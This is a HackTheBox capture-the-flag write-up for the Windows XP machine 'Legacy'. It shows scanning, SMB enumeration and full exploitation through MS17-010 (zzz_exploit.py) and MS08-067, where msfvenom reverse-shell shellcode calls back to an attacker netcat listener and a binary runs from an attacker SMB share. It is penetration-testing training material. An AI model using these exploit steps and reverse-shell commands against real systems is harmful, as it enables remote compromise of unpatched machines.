---
render_with_liquid: false
title: HackTheBox Writeup  Legacy
date: 2023-10-31 11:13:08 +1400
tags: [hackthebox, nmap, windows, crackmapexec, eternal-blue, ms17-010, win-xp, oscp-like, cve-2008-4250, ms08-067, msfvenom]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ pt init '10.129.158.214 legacy LEGACY.legacy' -i tun1
+---------+--------+----------------+---------------+
| PROFILE | STATUS |       IP       |    DOMAIN     |
+---------+--------+----------------+---------------+
| legacy  | on     | 10.129.158.214 | legacy        |
| legacy  | on     | 10.129.158.214 | LEGACY.legacy |
+---------+--------+----------------+---------------+
```

## Nmap


### Standard

```bash

# Nmap 7.94 scan initiated Tue Oct 31 11:13:07 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 135,139,445 10.129.158.214
Nmap scan report for 10.129.158.214
Host is up, received user-set (0.081s latency).
Scanned at 2023-10-31 11:13:08 CST for 17s

PORT    STATE SERVICE     REASON          VERSION
135/tcp open  msrpc       syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  0]V      syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:5f:13 (VMware)
| Names:
|
| Statistics:
|   00:50:56:b9:5f:13:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 17246/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18263/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 10875/udp): CLEAN (Failed to receive data)
|   Check 4 (port 30166/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-11-05T07:10:42+02:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d00h57m26s, deviation: 1h24m51s, median: 4d23h57m26s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Oct 31 11:13:25 2023 -- 1 IP address (1 host up) scanned in 17.86 seconds
```

### Vuln

```bash

# Nmap 7.94 scan initiated Tue Oct 31 11:14:43 2023 as: nmap -T4 -Pn --script vuln -vv -oA ./nmap/vuln -p 135,139,445 10.129.158.214
Nmap scan report for 10.129.158.214
Host is up, received user-set (0.081s latency).
Scanned at 2023-10-31 11:14:53 CST for 29s

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-054: false

Read data files from: /usr/bin/../share/nmap

# Nmap done at Tue Oct 31 11:15:22 2023 -- 1 IP address (1 host up) scanned in 39.33 seconds
```

## SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ cme smb $(pt get rhost) -u '' -p ''
SMB         10.129.158.214  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.129.158.214  445    LEGACY           [+] legacy\:

┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ cme smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.158.214  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.129.158.214  445    LEGACY           [-] legacy\a: STATUS_LOGON_FAILURE
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ cme smb $(pt get rhost) -u '' -p '' --shares
SMB         10.129.158.214  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.129.158.214  445    LEGACY           [+] legacy\:
SMB         10.129.158.214  445    LEGACY           [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ cme smb $(pt get rhost) -u 'a' -p '' --shares
SMB         10.129.158.214  445    LEGACY           [*] Windows 5.1 x32 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
SMB         10.129.158.214  445    LEGACY           [-] legacy\a: STATUS_LOGON_FAILURE
```

# User Flag
---


# Root Flag
---

## Eternal Blue (ms17-010)

Confirmed vulnerable with useable pipe

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ cd /opt/sectools/CVE/AutoBlue-MS17-010

┌──(bravosec㉿fsociety)-[/opt/sectools/CVE/AutoBlue-MS17-010]
└─$ python eternal_checker.py legacy
[*] Target OS: Windows 5.1
[!] The target is not patched
=== Testing named pipes ===
[+] Found pipe 'browser'
[*] Done
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/CVE/AutoBlue-MS17-010]
└─$ python zzz_exploit.py legacy -pipe browser
[*] Target OS: Windows 5.1
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x861893a8
SESSION: 0xe10ea698
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe22d4338
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe22d43d8
[*] overwriting token UserAndGroups
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^)
[!] Executing interactive programs will hang shell!
C:\WINDOWS\system32>whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Host the missing `whoami.exe` with `smbv1` (`smbv2` not supported on windows XP)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy/smb]
└─$ locate whoami.exe
/home/kali/.wine/drive_c/windows/system32/whoami.exe
/home/kali/.wine/drive_c/windows/syswow64/whoami.exe
/usr/lib/i386-linux-gnu/wine/i386-windows/whoami.exe
/usr/lib/x86_64-linux-gnu/wine/x86_64-windows/whoami.exe
/usr/share/windows-resources/binaries/whoami.exe
/var/lib/veil/wine/drive_c/windows/system32/whoami.exe

┌──(bravosec㉿fsociety)-[~/htb/Legacy/smb]
└─$ cp /usr/share/windows-resources/binaries/whoami.exe .

┌──(bravosec㉿fsociety)-[~/htb/Legacy/smb]
└─$ smbserver.py s .
```

```bash
C:\WINDOWS\system32>\\10.10.16.3\s\whoami.exe
NT AUTHORITY\SYSTEM
```

There's no `Users` directory in windows XP

```bash
C:\WINDOWS\system32>dir "C:\Documents and Settings"
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  08:07 ��    <DIR>          .
16/03/2017  08:07 ��    <DIR>          ..
16/03/2017  08:07 ��    <DIR>          Administrator
16/03/2017  07:29 ��    <DIR>          All Users
16/03/2017  07:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.312.173.568 bytes free
```

```bash
C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\*.txt"

C:\Documents and Settings\john\Desktop\user.txt


e69af0e4f443de7e36876fda4ec7644f
C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\*.txt"

C:\Documents and Settings\Administrator\Desktop\root.txt


993442d258b0e0ec917cae9e695d5713
```

# Additional
---

## CVE-2008-4250 (MS08-067)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ searchsploit --cve 'CVE-2008-4250'
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                                                                          | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                                                                           | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                                                                     | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                                                                      | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                                                                                                 | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                                                                                 | windows/remote/7132.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Use the POC from [here](https://github.com/jivoi/pentest) that was created for offsec

```bash
wget https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
```

![](/assets/obsidian/957d830dc582e1ebc888817a4bfe290f.png)

Generate shell code

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$(pt get lhost) LPORT=1111 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

```bash
vi ms08-067.py
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ python ms08-067.py legacy 6 445

#######################################################################

#   MS08-067 Exploit

#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).

#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi

#

#   Mod in 2018 by Andy Acer

#   - Added support for selecting a target port at the command line.

#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport

#   - Changed shellcode handling to allow for variable length shellcode.

#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .



#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:legacy[\pipe\browser]
Exploit finish
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Legacy]
└─$ rlwrap -r -f . nc -nlvp 1111
listening on [any] 1111 ...
connect to [10.10.16.3] from (UNKNOWN) [10.129.47.56] 1037
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>\\10.10.16.3\s\whoami.exe
\\10.10.16.3\s\whoami.exe
NT AUTHORITY\SYSTEM

C:\WINDOWS\system32>
```